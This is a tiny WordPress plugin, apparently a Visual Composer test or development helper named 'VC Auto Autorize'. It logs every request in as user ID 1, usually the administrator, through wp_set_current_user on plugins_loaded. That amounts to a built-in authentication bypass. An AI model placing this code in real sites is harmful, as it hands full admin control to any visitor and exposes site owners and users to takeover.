<?php
/*
Plugin Name: VC Auto Autorize
Plugin URI: http://visualcomposer.com
Description: VC Auto Autorize
Version: 1.0
Author: VV - Visual Composer
Author URI: http://visualcomposer.com
*/
add_action('plugins_loaded', function () {
    wp_set_current_user(1, true);
});
